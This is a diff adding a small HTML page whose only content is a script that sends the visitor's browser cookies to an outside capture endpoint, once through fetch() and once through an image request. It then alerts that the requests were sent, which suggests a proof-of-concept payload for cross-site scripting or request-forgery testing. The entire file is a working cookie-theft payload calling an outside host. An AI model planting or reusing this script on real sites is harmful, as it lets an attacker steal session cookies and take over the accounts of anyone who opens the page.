@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <script>
+    fetch('https://ssrf-eta.vercel.app/api/capture?from=static_fetch&c='+encodeURIComponent(document.cookie));
+    var i = new Image();
+    i.src = 'https://ssrf-eta.vercel.app/api/capture?from=static_img&c='+encodeURIComponent(document.cookie);
+    alert('Requests sent! Check your server logs.');
+  </script>
+</body>
+</html>
